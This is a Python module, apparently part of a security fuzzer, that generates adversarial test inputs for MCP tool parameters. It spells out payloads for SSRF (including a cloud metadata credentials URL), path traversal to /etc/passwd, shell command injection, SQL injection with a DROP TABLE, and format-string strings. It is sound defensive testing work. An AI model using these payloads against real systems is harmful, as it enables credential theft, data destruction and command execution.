"""Adversarial payload generation for MCP tools.

Given a tool definition, produce fuzz cases. Payload selection is
capability-aware: the classifier labels each parameter with a role (path, url,
command, query, host, content) and each role gets the payload family that
actually exercises its bug class. On top of that, schema-driven mutations
(type confusion, boundary values) and protocol-level malformations are added
for every tool.
"""

from __future__ import annotations

from typing import Any

from classifier.classify import classify_tool
from fuzzer.models import FuzzCase

# Control-byte payloads built with chr() so no raw control bytes sit in source.
_NUL = chr(0)
_NULL_PATH = "/etc/passwd" + _NUL + ".txt"
_CONTROL_BYTES = _NUL + chr(1) + chr(2) + " control-bytes"
_UNICODE_TRICKS = "unicode-" + chr(0x1F600) + chr(0x202E) + "-rtl"
_HUGE = "A" * 100_000

# Role-targeted payloads: (category, value).
_SSRF = [
    ("ssrf", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
    ("ssrf", "http://[::1]/"),
    ("ssrf", "http://127.0.0.1:22/"),
    ("ssrf", "file:///etc/passwd"),
    ("ssrf", "http://metadata.google.internal/computeMetadata/v1/"),
    ("ssrf", "gopher://127.0.0.1:6379/_INFO"),
]
_TRAVERSAL = [
    ("path-traversal", "../../../../../../etc/passwd"),
    ("path-traversal", "/etc/passwd"),
    ("path-traversal", "..\\..\\..\\..\\windows\\win.ini"),
    ("path-traversal", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"),
    ("path-traversal", _NULL_PATH),
    ("path-traversal", "file:///etc/passwd"),
]
_CMD = [
    ("command-injection", "; id"),
    ("command-injection", "$(id)"),
    ("command-injection", "`id`"),
    ("command-injection", "| id"),
    ("command-injection", "&& id"),
    ("command-injection", "\nid\n"),
]
_SQL = [
    ("sql-injection", "' OR '1'='1"),
    ("sql-injection", "'; DROP TABLE sqlite_master;--"),
    ("sql-injection", "1) UNION SELECT name FROM sqlite_master--"),
    ("sql-injection", '" OR 1=1--'),
]
_CONTENT = [
    ("boundary", "%s%s%s%s%n"),
    ("boundary", _HUGE),
    ("boundary", _CONTROL_BYTES),
]

_ROLE_PAYLOADS: dict[str, list[tuple[str, str]]] = {
    "url": _SSRF,
    "host": _SSRF,
    "path": _TRAVERSAL,
    "command": _CMD,
    "query": _SQL,
    "content": _CONTENT,
}

# Schema-driven mutations applied to any declared parameter.
_MUTATIONS: list[tuple[str, Any]] = [
    ("type-confusion", 1337),
    ("type-confusion", ["array", "where", "string", "expected"]),
    ("type-confusion", {"nested": {"object": True}}),
    ("type-confusion", None),
    ("type-confusion", True),
    ("boundary", ""),
    ("boundary", _HUGE),
    ("boundary", _UNICODE_TRICKS),
    ("boundary", "%s%n%x"),
]


def _benign_value(defn: dict) -> Any:
    t = defn.get("type")
    if t in ("integer", "number"):
        return 1
    if t == "boolean":
        return False
    if t == "array":
        return []
    if t == "object":
        return {}
    return "test"


def _baseline_args(props: dict, required: list[str]) -> dict[str, Any]:
    """A benign, schema-plausible argument set, so a single fuzzed parameter is
    the only variable in the request."""
    return {name: _benign_value(props.get(name, {}) or {}) for name in required}


def generate_cases(tool: dict, *, max_per_tool: int = 48) -> list[FuzzCase]:
    name = tool.get("name", "")
    schema = tool.get("inputSchema") or {}
    props = schema.get("properties") or {}
    required = list(schema.get("required") or [])
    base = _baseline_args(props, required)
    cls = classify_tool(tool)

    cases: list[FuzzCase] = []

    # 1) Role-targeted payloads for classified parameters.
    for pname, prole in cls.parameter_roles.items():
        for category, value in _ROLE_PAYLOADS.get(prole.role, []):
            cases.append(
                FuzzCase(name, {**base, pname: value}, category, pname, f"{prole.role} payload")
            )

    # 2) Schema-driven mutations for every declared parameter.
    for pname in props:
        for category, value in _MUTATIONS:
            cases.append(FuzzCase(name, {**base, pname: value}, category, pname, "schema mutation"))

    # 3) Protocol-level malformations against the tool as a whole.
    cases.append(FuzzCase(name, {}, "protocol", None, "omit all arguments"))
    cases.append(
        FuzzCase(
            name, {**base, "__unexpected__": "x" * 1000}, "protocol", None, "extra unknown argument"
        )
    )

    return cases[:max_per_tool]
